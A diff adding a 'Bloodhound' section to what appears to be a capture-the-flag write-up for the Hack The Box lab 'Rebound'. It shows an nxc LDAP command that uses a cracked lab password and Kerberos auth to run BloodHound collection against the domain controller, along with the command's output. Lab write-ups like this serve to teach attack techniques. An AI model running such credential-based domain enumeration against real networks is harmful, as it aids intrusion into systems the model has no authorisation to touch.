@@ -253,4 +253,14 @@ oorend:1GR8t@$$4u
 This user also has no more access on SMB
 
 # Bloodhound
-
+## Loot collection
+```python
+faketime -f +7h nxc ldap dc01.rebound.htb -u 'ldap_monitor' -p '1GR8t@$$4u' -k --dns-server 10.129.14.17 --bloodhound -c All
+LDAP        dc01.rebound.htb 389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb) (signing:Enforced) (channel binding:Always)
+LDAP        dc01.rebound.htb 389    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u 
+LDAP        dc01.rebound.htb 389    DC01             Resolved collection methods: session, dcom, psremote, group, container, objectprops, localadmin, rdp, acl, trusts
+LDAP        dc01.rebound.htb 389    DC01             Using kerberos auth without ccache, getting TGT
+LDAP        dc01.rebound.htb 389    DC01             Done in 0M 4S
+LDAP        dc01.rebound.htb 389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_dc01.rebound.htb_2026-04-04_222023_bloodhound.zip
+```
+Ive had to use kerberos authentication to collect the loot
